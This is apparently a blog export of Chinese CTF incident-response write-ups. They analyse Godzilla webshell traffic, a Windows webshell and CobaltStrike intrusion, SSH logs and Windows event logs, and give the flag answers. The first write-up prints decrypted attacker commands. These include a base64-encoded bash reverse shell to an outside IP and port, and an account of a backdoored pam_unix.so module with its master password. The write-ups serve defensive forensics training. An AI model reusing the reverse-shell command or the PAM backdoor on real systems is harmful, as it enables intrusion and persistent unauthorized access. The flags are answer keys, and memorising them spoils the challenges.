搜索得到漏洞编号为CVE-2017-12615 1flag{CVE-2017-12615} 步骤#3黑客上传的木马文件名是什么？(提交文件名) 由步骤二可知，木马文件名为hello.jsp 1flag{hello.jsp} 步骤#4黑客上传的木马连接密码是什么？ 参考步骤二可知，连接密码为7f0e6f 也可以通过看Webshell通信包得到连接密码 1flag{7f0e6f} 步骤#5黑客上传的木马解密密钥是什么？ 由步骤二可知，密钥为1710acba6220f62b 1flag{1710acba6220f62b} 步骤#6黑客连接webshell后执行的第一条命令是什么？ 这里用到abc123师傅开发的蓝队分析研判工具箱，感谢师傅开源 Github地址：https://github.com/abc123info/BlueTeamTools 首先用wireshark语法把hello.jsp的通信流量全部筛选出来 1http.request.method == POST and http.request.uri contains &quot;hello.jsp&quot; 可以看到总共18个数据包，逐个追踪HTTP流 用蓝队分析研判工具箱进行解密，把请求的body复制进去，然后点击解密请求数据包 解密发现数据流44、45只是连接哥斯拉时默认执行的，因此忽略不计，从数据流46开始分析 以下是数据流46到结尾的解密结果 数据流46 1234请求cmdLine sh -c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs -c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 cd &quot;/&quot;;uname -rmethodName execCommand响应4.19.0-25-amd64 数据流47 1234请求cmdLine sh -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 cd &quot;/&quot;;idmethodName execCommand响应uid=0(root) gid=0(root) groups=0(root) 数据流48 123456789101112请求cmdLine sh -c &quot;cd &quot;/&quot;;cat /etc/os-release&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs$ -c &quot;cd &quot;/&quot;;cat /etc/os-release&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 cd &quot;/&quot;;cat /etc/os-releasemethodName execCommand响应PRETTY_NAME=&quot;Debian GNU/Linux 10 (buster)&quot;NAME=&quot;Debian GNU/Linux&quot;VERSION_ID=&quot;10&quot;VERSION=&quot;10 (buster)&quot;VERSION_CODENAME=busterID=debianHOME_URL=&quot;https://www.debian.org/&quot;SUPPORT_URL=&quot;https://www.debian.org/support&quot;BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot; 数据流49 123456789请求1cmdLine &amp; sh -c &quot;cd &quot;/&quot;;rmp -qa | grep pam&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs # -c &quot;cd &quot;/&quot;;rmp -qa | grep pam&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 cd &quot;/&quot;;rmp -qa | grep pammethodName execCommand响应12&gt;&amp;1: 1: 2&gt;&amp;1: rmp: not found请求2cmdLine sh -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs -c &quot;cd &quot;/&quot;;id&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 cd &quot;/&quot;;idmethodName xecCommand响应2uid=0(root) gid=0(root) groups=0(root) 数据流50 1234请求cmdLine &amp; sh -c &quot;cd &quot;/&quot;;rpm -qa | grep pam&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs # -c &quot;cd &quot;/&quot;;rpm -qa | grep pam&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 cd &quot;/&quot;;rpm -qa | grep pammethodName execCommand响应2&gt;&amp;1: 1: 2&gt;&amp;1: rpm: not found 数据流51 123456789请求cmdLine 0 sh -c &quot;cd &quot;/&quot;;dpkg -l libpam-modules:amd64&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs - -c &quot;cd &quot;/&quot;;dpkg -l libpam-modules:amd64&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 # cd &quot;/&quot;;dpkg -l libpam-modules:amd64methodName execCommand响应Desired=Unknown/Install/Remove/Purge/Hold| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)||/ Name Version Architecture Description+++-====================-============-============-========================================ii libpam-modules:amd64 1.3.1-5 amd64 Pluggable Authentication Modules for PAM 数据流52 1234请求cmdLine l sh -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs i -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 _ cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bashmethodName execCommand响应空 数据流53 空 数据流54 12345678910111213141516171819202122232425262728293031323334请求methodName getFiledirName /响应ok//wget-log 1 2024-09-19 08:15:47 0 RWlib 0 2024-09-18 08:06:13 4096 RWXusr 0 2023-12-25 02:31:52 4096 RWXlib32 0 2023-12-25 02:31:48 4096 RWXlibx32 0 2023-12-25 02:31:48 4096 RWXlost+found 0 2023-12-25 02:31:44 16384 RWXsbin 0 2024-09-18 08:06:06 12288 RWXvmlinuz 1 2023-08-07 22:35:25 5283136 RWopt 0 2024-09-19 08:41:28 4096 RWXmnt 0 2023-12-25 02:31:52 4096 RWXetc 0 2024-09-19 07:35:49 4096 RWXroot 0 2024-09-19 08:41:48 4096 RWXsrv 0 2023-12-25 02:31:52 4096 RWXproc 0 2024-09-19 06:29:54 0 RWXdev 0 2024-09-19 06:29:58 3160 RWXinitrd.img.old 1 2023-12-25 02:32:56 28089917 RWinitrd.img 1 2023-12-25 02:34:12 28246009 RWvmlinuz.old 1 2020-07-24 14:46:18 5274864 RWvar 0 2023-12-25 02:31:52 4096 RWXwget-log.1 1 2024-09-19 08:15:47 0 RWlib64 0 2024-09-18 08:05:13 4096 RWXmedia 0 2023-12-25 02:31:45 4096 RWXboot 0 2023-12-25 02:41:35 1024 RWXtmp 0 2024-09-19 09:00:35 4096 RWXrun 0 2024-09-19 09:00:35 600 RWXwget-log.2 1 2024-09-19 08:15:47 0 RWhome 0 2023-12-25 02:43:00 4096 RWXbin 0 2024-09-19 07:35:48 28672 RWXsys 0 2024-09-19 06:29:55 0 RWX 数据流55 123456789101112131415161718192021请求methodName getFiledirName /tmp/响应ok/tmp/ssh-rJgBkHZMg0 0 2024-09-19 08:30:00 4096 RWXcode-8a1ad303-d54a-4ee6-bf06-79c09e867bed 1 2024-09-19 08:15:43 0 RWX.XIM-unix 0 2024-09-19 06:29:59 4096 RWXssh-vWnAfxielC 0 2024-09-19 08:43:32 4096 RWXssh-HqBIxaU2OF 0 2024-09-19 08:15:37 4096 RWXhsperfdata_root 0 2024-09-19 06:29:59 4096 RWXsystemd-private-fe1119a9e31340ada72ff5bdd7dcb056-systemd-timesyncd.service-wVf4Jf 0 2024-09-19 06:29:59 4096 RWX1.pcap 1 2024-09-19 09:03:14 1490944 RW.Test-unix 0 2024-09-19 06:29:59 4096 RWX.X11-unix 0 2024-09-19 06:29:59 4096 RWX.ICE-unix 0 2024-09-19 06:29:59 4096 RWX.font-unix 0 2024-09-19 06:29:59 4096 RWXssh-P22RjIKAZ3 0 2024-09-19 08:19:17 4096 RWXssh-F8xrTEcjZ2 0 2024-09-19 08:39:58 4096 RWXssh-JmgaMLTFgu 0 2024-09-19 08:21:23 4096 RWXssh-r6qMz7wlBA 0 2024-09-19 09:00:35 4096 RWX 数据流56 1234请求fileName /tmp/pam_unix.sofileValue NELF响应ok 数据流57 1234请求cmdLine l sh -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs i -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 _ cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bashmethodName execCommand响应空 分析数据流46，前面的cmdLine sh -c &quot;cd &quot;/&quot;是哥斯拉自动执行的，后面的uname -r是攻击者执行的，因此答案就是这个 1flag{uname -r} 步骤#7黑客连接webshell时查询当前shell的权限是什么？ 由步骤六的数据流47可知，攻击者执行了命令id，用于查询用户和用户组相关的身份信息 1uid=0(root) gid=0(root) groups=0(root) 因此当前shell的权限就是root 1flag{root} 步骤#8黑客利用webshell执行命令查询服务器Linux系统发行版本是什么？ 分析步骤六中的数据流，发现数据流48运行了命令cat /etc/os-release，该命令主要作用是查看 Linux 操作系统的详细版本和发行相关信息 123456789PRETTY_NAME=&quot;Debian GNU/Linux 10 (buster)&quot;NAME=&quot;Debian GNU/Linux&quot;VERSION_ID=&quot;10&quot;VERSION=&quot;10 (buster)&quot;VERSION_CODENAME=busterID=debianHOME_URL=&quot;https://www.debian.org/&quot;SUPPORT_URL=&quot;https://www.debian.org/support&quot;BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot; 因此答案就是PRETTY_NAME的值 1flag{Debian GNU/Linux 10 (buster)} 步骤#9黑客利用webshell执行命令还查询并过滤了什么？（提交整条执行成功的命令） 数据流49，攻击者先是错误地输入了 rmp，发现命令不存在 然后数据流50中攻击者修正了命令为 rpm，执行rpm -qa | grep pam，但是返回结果仍显示not found 12&gt;&amp;1: 1: 2&gt;&amp;1: rpm: not found rpm命令是用于管理RPM包的命令行工具，这个命令是在查询pam相关的包，pam模块与Linux的用户认证有关，是一个非常敏感和危险的位置 在数据流51，攻击者根据之前的失败，推断出这不是一个基于RPM的系统（如CentOS），转而使用Debian/Ubuntu系的 dpkg 命令进行查询，并成功获取了信息 123456Desired=Unknown/Install/Remove/Purge/Hold| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)||/ Name Version Architecture Description+++-====================-============-============-========================================ii libpam-modules:amd64 1.3.1-5 amd64 Pluggable Authentication Modules for PAM 攻击者执行成功的命令就是dpkg -l libpam-modules:amd64 1flag{dpkg -l libpam-modules:amd64} 步骤#10黑客留下后门的反连的IP和PORT是什么？（IP:PORT) 数据流52中的请求体中存在base64编码 1L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ== 解码后得到结果为 很明显，这个就是反连命令，因此IP是192.168.31.143，端口为1313 1flag{192.168.31.143:1313} 步骤#11黑客通过什么文件留下了后门？ 继续分析步骤六中的数据包，发现数据流56跟文件相关 1234请求fileName /tmp/pam_unix.sofileValue NELF响应ok 攻击者上传了一个恶意的PAM模块文件 pam_unix.so。该方法攻击原理是，用这个恶意文件替换掉Linux系统中负责密码验证的核心模块，从而植入一个“万能密码”（例如 password123）或“后门用户”（无论输入什么密码都能成功），从而实现对系统身份认证机制的劫持 可以看到攻击者上传路径为/tmp/pam_unix.so，这个先记住，后面有用 因此后门文件就是这个 1flag{pam_unix.so} 步骤#12黑客设置的后门密码是什么？ 连接到玄机靶场机器，进去后执行history查看攻击者执行的历史命令 可以看到，攻击者先将系统正常的用户密码认证模块（pam_unix.so）备份成一个隐藏文件，然后用自己上传的、含有后门功能的同名恶意文件（/tmp/pam_unix.so）替换掉原始文件（/lib/x86_64-linux-gnu/security/pam_unix.so） 直接在/tmp里面查找会找不到pam_unix.so，估计是攻击者删除了 那我们去/lib/x86_64-linux-gnu/security目录查找，成功找到目标文件 将pam_unix.so拷贝下来，用IDA进行静态分析 pam_sm_authenticate 是 Linux PAM（可插拔认证模块，Pluggable Authentication Modules）中认证服务模块的核心函数，专门用于验证用户身份 因此我们找到函数pam_sm_authenticate进行分析，成功获得后门密码XJ@123 1flag{XJ@123} 步骤#13黑客的恶意dnslog服务器地址是什么？ wireshark语法搜索dns，可以找到黑客的恶意dnslog服务器地址，但是要注意这个地址后面有个点号（后面分析IDA发现的） 或者可以通过IDA分析pam_sm_authenticate认证函数来获取dnslog地址 1flag{c0ee2ad2d8.ipv6.xxx.eu.org.} 参考momo安全：https://mp.weixin.qq.com/s/rhPT5H0IZ4nm6JcgacRg8Q","link":"/posts/Xuanji-CTF-Godzilla-Traffic-Analysis/"},{"title":"玄机靶场 | Where-1S-tHe-Hacker-P2","text":"前言靶机可以用玄机的，也可以在公众号下载，这里我选择用自己下载的，感谢划水但不摆烂提供的资源 题目下载地址：https://pan.baidu.com/s/14OPvxDgsEsY-O3e34K2FUw?pwd=2024 划水应急工具包：https://pan.baidu.com/s/1dwBMRQO3TUEMx8FWVeJLew?pwd=ltja 服务器账号密码 admin Aa123456 进去后运行phpstudy开启相关服务 因为玄机的题目是从靶机内部题目挑选的，不完整，因此本文分两部分 索引 玄机题目步骤#1最早的WebShell落地时间是（时间格式统一为：2022/12/12/2:22:22）; 上传D盾到目标机器，把C:\\phpstudy_pro\\WWW目录放入D盾扫描 发现大量WebShell文件，点进去C:\\phpstudy_pro\\WWW\\attachment\\php\\2023\\11，按时间排序，找到最早的WebShell落地时间即可 1flag{2023/11/11/0:30:07} 步骤#2黑客最早的WebShell密码是多少，将WebShell密码作为Flag值提交； 用记事本打开WebShell文件，找到连接密码 1flag{pass} 步骤#3CobaltStrike木马被添加进计划任务的时间是 win+r输入taskschd.msc打开任务计划程序，找到\\Microsoft\\Windows\\AppID\\，查看计划任务，发现有个可疑任务，在每天9:50自动触发，查看启动程序 但是这个huorong.exe我怎么找都找不到，网上百度了一下，发现别人也找不到，最后查看官方WP确定了这是个木马文件，但是不知道什么原因找不到了 然后我们导出该文件，用浏览器打开 成功得到CobaltStrike木马文件的修改时间 1flag{2023/11/15/8:02:20} 步骤#4黑客启用并添加进管理员组的用户与时间是 答案格式：Username,2022/12/12/2:22:22）； 用D盾检测用户账号，发现Guest被启用并添加进管理员组 cmd打开输入net user guest查看guest的修改时间 1flag{guest,2023/11/11/0:45:59} 步骤#5攻击者使用弱口令登录ftp的时间是 打开C:\\phpstudy_pro\\Extensions\\FTP0.9.60\\Logs查看FTP的登录日志 总共三个，一个个点进去看看，发现第二个有问题 成功得到攻击者登录ftp的时间 1flag{2023/11/11/1:08:54} 步骤#6攻击者使用弱口令登录web管理员的时间是 这里我们主要审计Apache的日志，打开C:\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs，审计access.log.1700006400 题目问的是攻击者使用弱口令登录web管理员的时间，我们可以尝试用弱口令自己爆破网站，然后抓取登录成功的包，在日志里面进行匹配，就可以找到攻击者的登录时间 打开浏览器输入127.0.0.1/index.php，然后点击上一级，回到首页 用弱口令字典爆破即可，不限方法，爆破得到账号为admin，密码为123456，然后登录抓包 重新回到日志，ctrl+f搜索index.php?mod=site&amp;act=manager&amp;do=main&amp;beid=1 成功得到攻击者登录后台管理页面的时间 如果你不想爆破网站，直接分析日志也可以，一般情况下登录成功会有302跳转，我们可以直接筛选302跳转，并根据日志特征进行匹配 可以看到URI里面包含manager，通过上下文分析，可以确定这是登录成功的跳转页面，不过想更精确的话还是第一种方法好 1flag{2023/11/15/7:38:31} 靶机内部题目（除去相同题目）步骤#7CobaltStrike远程控制木马的文件名与落地时间是？（答案格式：ABC.exe,2022/12/12/2:22:22） 这题我用绿盟D-Eyes扫了很久都没扫出来，在安全中心的隔离区也没找到，不知道什么原因，查找计划任务里面的木马路径也没有 一般情况下遇到这种题目，我们用安全工具扫描就可以，例如火绒、绿盟D-Eyes等，但是这里不知道为什么电脑找不到这个木马 这里直接给出官方的答案 1huorong.exe,2023/11/15/7:45:47 步骤#8攻击者查看上传回显路径的时间是？ 攻击者上传木马之后，需要知道文件被上传到哪里，这时我们从攻击者登录后台管理员账号的时间之后开始审计日志 这里可以看到，在一大波注入攻击之后出现一个文件查询的URI，猜测是显示文件路径的，我们粘贴到网页执行（先登录网站） 这些参数的URL就是木马文件路径，可以尝试蚁剑连接验证 确定是木马文件，成功得到攻击者查看上传回显路径的时间 12023/11/15/7:38:53 步骤#9第二批WebShell的最早上传时间是？ 前面我们知道了木马的回显路径，因此可以在该路径上进行分析，打开C:\\phpstudy_pro\\WWW\\attachment\\2023\\11，然后按时间排序，可以看到木马的上传时间分两个时间段，一些是2023/11/11，另一些是2023/11/15 打开15号最早的文件验证，确定是木马文件 右键打开属性，获取具体时间 当然如果想稳妥的话还是分析日志文件好，打开C:\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs\\access.log.1700006400，筛选出状态码为200的日志记录进行分析 可以看到这里攻击者采用了SSRF攻击，通过在inc_config.php写入木马，让网站去fetch这个文件并保存在本地，然后通过webshell连接并控制网站，因此第二批WebShell的最早上传时间就是这个 12023/11/15/7:40:10 步骤#10根据上题线索，WebShell开始通信的时间是？ 沿着上面的日志记录继续往下分析，发现可疑记录 可以看到发送POST请求，与木马文件进行交互，打开文件验证一下 因此WebShell开始通信的时间就是这个 12023/11/15/7:42:36 靶机内部题目答案这是靶机内部答题.exe的答案 参考特别鸣谢 划水但不摆烂：https://mp.weixin.qq.com/s/4PQ5TaBUUpW_9hkm-kue1Q","link":"/posts/Xuanji-CTF-Where-1S-tHe-Hacker-P2/"},{"title":"玄机靶场 | 日志分析-ssh日志分析","text":"前言SSH连接端口222，账号：root，密码：toor SSH日志分析常用思路SSH日志分析是应急响应与安全审计的核心。通过审查配置文件和登录日志，可以快速发现未授权访问、定位攻击源并核查安全基线。标准的分析流程如下： 1. 审查配置：确认“规则” 分析日志前，先看SSH服务的核心配置文件 /etc/ssh/sshd_config，了解允许哪些行为 访问控制：检查 AllowUsers, AllowGroups 等指令，确定谁可以登录 认证方式：检查 PasswordAuthentication 是否开启，是否仅允许密钥登录 高危设置：检查 PermitRootLogin 是否允许root直接登录 2. 分析日志：发现“事件” 根据系统，主要分析以下认证日志（包括 .1, .gz 等归档文件）： Debian/Ubuntu: /var/log/auth.log CentOS/RHEL: /var/log/secure 重点关注包含以下关键字的日志条目： 成功登录：Accepted password 或 Accepted publickey 等 登录失败：Failed password 、Failed publickey 或 invalid user 等 用户切换/提权：session opened for user (常用于追踪sudo等操作) 3. 聚合统计：提取“情报” 使用命令行工具（如 grep, awk, sort, uniq）从海量日志中提取有价值的信息，回答关键问题： 攻击来源：哪个IP发起了最多的失败尝试？ 爆破目标：哪个用户名被攻击次数最多？ 成功渗透：哪些用户和IP成功登录了系统？ 行为画像：梳理单个IP或用户的完整活动时间线 索引 题目列表步骤#1可以登录 SSH 的账号数量是多少 我们先了解什么是sshd_config文件 sshd_config 是 SSH 服务器（sshd）的主配置文件，用于配置 SSH 服务端的各种参数和行为 设置 SSH 服务器监听的端口号（默认22端口） 指定允许或禁止的登录方式（密码认证、公钥认证等） 是否允许 root 账户远程登录 配置登录超时时间、日志级别、安全策略等 控制哪些用户或用户组可以通过SSH登录 查看/etc/ssh/sshd_config文件 1cat /etc/ssh/sshd_config 在最下面那里可以看到只允许SSHD_USER用户组和root用户组进行ssh登录 然后在/etc/group筛选出这两个组 1grep -E '^(root|SSHD_USER):' /etc/group 这个命令的意思是： -E 参数表示启用扩展正则表达式，支持更多高级符号和语法，如“|”表示或、“()”用于分组、“+”表示重复等，使表达式更简洁易读，匹配功能更强大 ^(root|SSHD_USER): 表示匹配以“root:”或“SSHD_USER:”开头的行 root组后面为空，表示这个组没有附加用户（也就是没有把别的用户名手动加进组内），默认为root。然后SSHD_USER组有两个用户，分别为toor和root，去重之后可以登录 SSH 的账号就只有toor和root用户 1flag{2} 步骤#2SSH日志中登录成功的日志条数是多少（去除自己登陆产生的两次） auth.log 是Linux系统记录身份认证相关信息的日志文件，包括用户登录成功、失败、ssh连接、公钥认证和使用sudo等操作的记录。它帮助管理员监控登录情况和发现安全问题，是安全审计的重要依据 其中auth.log表示最新日志，auth.log.1表示上一轮未压缩归档，auth.log.N.gz表示更早的归档（N为数字） 进入log日志文件夹，查看当前目录文件 1cd /var/log &amp;&amp; ls 我们要分析的是已归档文件，也就是auth.log.1和auth.log.2.gz 先解压auth.log.2.gz文件 1gzip -d auth.log.2.gz 用gzip命令解压后，会删除原本的.gz压缩文件，并生成新的文件 然后筛选出包含Accepted password或Accepted publickey的日志记录即可 Accepted password：表示通过密码验证成功登录 Accepted publickey：表示通过公钥认证成功登录 1grep -E &quot;Accepted password|Accepted publickey&quot; auth.log.1 auth.log.2 | wc -l 1flag{103} 步骤#3SSH日志中登录成功次数最多的用户的用户名是什么 用awk筛选登录成功的日志记录即可 1grep -E &quot;Accepted password|Accepted publickey&quot; auth.log.1 auth.log.2 | awk '{print $9}' | sort | uniq -c 可以看到SSH日志中登录成功次数最多的用户名是toor 1flag{toor} 步骤#4SSH日志中登录失败次数最多的用户以及登录使用的ip是什么(flag:flag{用户名,ip}) 直接筛选出包含Failed password或Failed publickey的记录，然后awk查看用户名和IP地址即可 1grep -E &quot;Failed password|Failed publickey&quot; auth.log.1 auth.log.2 | awk '{print $9, $(NF-3)}' | sort | uniq -c | sort -n awk '{print $9, $(NF-3)}' 表示打印第9列（用户名）和倒数第4列（登录来源IP，通常日志中IP在倒数第4列） sort 对结果进行排序 uniq -c 统计相同用户名和IP的出现次数 sort -n 表示按照 数字大小 进行排序，而不是按字母ASCII顺序 可以看到SSH日志中登录失败次数最多的用户是root，登录使用的ip是87.163.111.11 1flag{root,87.163.111.11}","link":"/posts/Xuanji-CTF-SSH-Log-Analysis/"},{"title":"玄机靶场 | 日志分析-windows日志分析base","text":"前言题目描述：客户反映自己的用户在4月6日中午12点左右被挤掉线了，请你上机排查安全事件 RDP连接，端口3389，用户名：Administrator，密码：4210bf? 索引 题目列表步骤#1客户机的系统安全日志文件所在的绝对路径是？ win+r输入eventvwr.msc，打开事件查看器 然后点击windows日志，右键点击安全，打开属性 可以看到一个日志路径，这就是系统安全日志文件所在路径 1%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx 但这是相对路径，我们复制Security.evtx前面的路径，然后在文件资源管理器打开 会跳转到目录C:\\Windows\\System32\\winevt\\Logs，这就是系统安全日志文件所在的绝对路径。该路径一般是固定的，建议记住该位置方便以后进行查找 1flag{C:\\Windows\\System32\\winevt\\Logs} 步骤#2恶意用户是利用什么协议发起的登录？ 题目提示客户反映自己的用户在4月6日中午12点左右被挤掉线了 先介绍一下常见的事件ID类型 12345678910111213144624 登录成功4625 登录失败，如果有人尝试破解系统密码，可以看到大量连续登录失败信息4726 删除用户4722 账号启用4725 账号禁用4723 修改密码4724 重置密码4634 注销成功4647 用户启动的注销4672 管理员登录4720 创建用户，使用系统漏洞攻击成功后，往往会创建一个用户，方便远程登录4732 加入安全组，常见于将新用户加入管理员组4733 移除出安全组4684 通过登陆界面登陆的 我们返回事件查看器，设置筛选条件为4月6日早上9点到下午15点，由于是要查看攻击者是如何登陆的，所以事件ID我们选择4624和4625 然后按照时间顺序逐个分析，我们主要关注登录的账号名、登录类型、登录是否成功以及登录源IP 其中登录类型是以数字的形式列举出来的，所以我们需要对照以下表格分析 登录类型 说明 典型协议/场景 2 交互式登录（本地键盘或控制台） 本地 3 网络登录（访问共享、SMB等） SMB、HTTP（除明文） 4 批处理（计划任务） 本地/系统 5 服务账号 本地/系统 7 解锁（屏幕锁解锁） 本地 8 网络明文（如HTTP Basic认证） 明文HTTP、Advapi 9 新凭证（RunAs带netonly参数等） 本地与网络混合 10 远程交互登录（RDP等） RDP（远程桌面协议） 11 缓存交互（离线域登录） 本地缓存 分析到2025/4/6 11:33:34的日志时发现异常，出现了一个未知的IP，且登录失败，然后协议类型为10，也就是利用rdp登录 继续向下分析，发现该IP尝试了多个用户名进行rdp远程登录 根据收集的结果，总共尝试了admin、XJ、XuanJi、XiaoMa和Administrator这几个用户名，其中前四个都登录失败，最后一个Administrator登录成功，可以看出该IP在进行用户名爆破，因此推断这就是攻击者 所以恶意用户是利用rdp协议发起的登录 1flag{rdp} 步骤#3攻击者总共使用了几个账户名尝试登录？ 根据上一题的分析，可知攻击者使用了五个账号名尝试登录，分别为 1admin、XJ、XuanJi、XiaoMa、Administrator 因此答案就是5 1flag{5} 步骤#4攻击者总共在客户机上尝试创建了几个不同名用户？ 根据步骤二的常见事件ID类型，我们修改筛选条件为4720 可以看到总共有五个日志，我们逐个分析 发现有两个账号名均为hack，然后还有三个分别是hacker、hacker_real$、system13$，因此攻击者总共在客户机上尝试创建了4个不同名的用户 1flag{4}","link":"/posts/Xuanji-CTF-Windows-Security-Log-Analysis/"},{"title":"玄机靶场 | Where-1S-tHe-Hacker","text":"前言我一开始用的是在线靶机，但是因为一些不可抗拒因素，具体参考步骤#11，所以最终把靶机下载到本地分析，同时也能省点金币，题目可以在划水但不摆烂公众号下载 题目下载地址：https://pan.baidu.com/s/1MwRbI6Cbz2j_hlHInVL1Bg?pwd=fmzu 服务器账号密码 admin Aa123456 注：样本请勿在本地运行 索引 玄机题目步骤#1找到黑客ID 为多少,将黑客ID 作为 FLAG 提交; 打开网页根目录，发现index.php被挂了黑页，在文件内容里面找到黑客ID 1flag{X123567X} 步骤#2找到黑客在什么时间修改了网站主页,将黑客修改了网站主页的时间 作为 FLAG 提交（y-m-d-4:22:33）; 直接查看属性，找到修改时间 提交的时候有个问题，如果时间你是直接复制属性中的，提交时会显示错误，因为属性中的时间携带不可见字符，正确的做法是自己手打进去，具体可以看看010editor的分析 1flag{2023-11-6-4:55:13} 步骤#3找到黑客第一个webshell文件名是,将第一个webshell文件名 作为FLAG 提交; 可以用D盾，也可以手工排查，这里我选择手工排查 找到Apache目录下的访问日志 前面大量的HEAD表示的是黑客在进行目录扫描，可以不看，直接跳到后半部分扫描结束那里，通过排查，发现两个疑似webshell的可疑文件 去根目录下找到对应的文件，查看进行确认 发现两个都是黑客上传的webshell文件，按照时间顺序，第一个webshell文件名是SystemConfig.php 1flag{SystemConfig.php} 步骤#4找到黑客第二个webshell文件名是,将第二个webshell文件名 作为FLAG 提交; 同上，第二个webshell文件名是syscon.php 1flag{syscon.php} 步骤#5找到黑客第二个webshell的连接密码是,将第二个webshell的连接密码 作为FLAG 提交; 步骤三那里可以得到第二个webshell的连接密码是pass 1flag{pass} 步骤#6找到黑客新建的隐藏账户,将新建的隐藏账户名字 作为FLAG 提交; 有很多方法可以实现，这里选择注册表查看 win+r然后输入regedit打开注册表编辑器，找到HKEY_LOCAL_MACHINE\\SAM\\SAM，但是这里不能直接查看，我们右键点击SAM，赋予完全控制权限 然后重新打开注册表，进入HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names，找到当前计算机全部用户，发现隐藏用户为admin$ 有时候攻击者可能不会直接新增隐藏用户，而是通过修改Guest用户注册表对应的F值（权限分配）与本地管理Administrator的权限相同，相当于克隆了Administrator，这也需要我们额外注意 还有一个方法，就是直接在此电脑那里查看，更快速，但是平时的话还是建议用注册表来分析，更加精准 1flag{admin$} 步骤#7找到黑客隐藏账户创建时间是,将隐藏账户创建时间是 作为FLAG 提交（答案格式：2024/12/3 9:16:23）; 直接cmd打开，输入net user admin$查看账户详细信息 1flag{2023/11/6 4:45:34} 步骤#8找到黑客添加隐藏账户进管理员组的时间,将添加隐藏账户进管理员组的时间 作为FLAG 提交（答案格式：2024/12/3 9:16:23）; 这里要用到系统事件分析，按Win+R键输入eventvwr.msc打开事件查看器 常见事件ID类型 12345678910111213144624 登录成功4625 登录失败，如果有人尝试破解系统密码，可以看到大量连续登录失败信息4726 删除用户4722 账号启用4725 账号禁用4723 修改密码4724 重置密码4634 注销成功4647 用户启动的注销4672 管理员登录4720 创建用户，使用系统漏洞攻击成功后，往往会创建一个用户，方便远程登录4732 加入安全组，常见于将新用户加入管理员组4733 移除出安全组4684 通过登陆界面登陆的 这里我们筛选4732，时间的话我们根据admin$的创建时间，选择2023/11/6 4:45:00开始，结束时间随便，可以选小点缩小范围 一个个点进去查看，找到添加到管理员组的事件 注意时间格式 1flag{2023/11/6 4:46:07} 步骤#9找到黑客在什么时间从文件中读取保留的密钥,将读取保留的密钥的时间 作为FLAG 提交（答案格式：2024/12/3 9:16:23）; 这里我们聚焦于两个事件ID 125051 将保留的密钥写入文件5058 从文件中读取保留的密钥 也是通过事件查看器去找，时间我这里选择不变 也是按时间顺序找就行 注意时间格式 1flag{2023/11/6 4:46:58} 步骤#10找到黑客通过隐藏账户通过(PTH)哈希传递攻击登录的时间是,将(PTH)哈希传递攻击登录的时间 作为FLAG 提交; 哈希传递攻击指的是攻击者无需知道用户的明文密码，只需窃取密码的哈希值（Hash），就能冒充该用户登录到网络中的其他系统。 这里我们聚焦于NtLmSsp（NT LAN Manager Security Support Provider），它用于处理 NTLM 协议的身份验证，我们去筛选登录事件，找到登录进程为NtLmSsp的即可，对应的事件ID为4624 按照时间顺序一个个筛选 注意时间格式 1flag{2023/11/6 4:47:28} 步骤#11找到黑客上传的两个CobaltStrike木马文件名,将上传的两个CobaltStrike木马文件名 作为FLAG 提交（答案格式：”A.exe,B.exe”）; 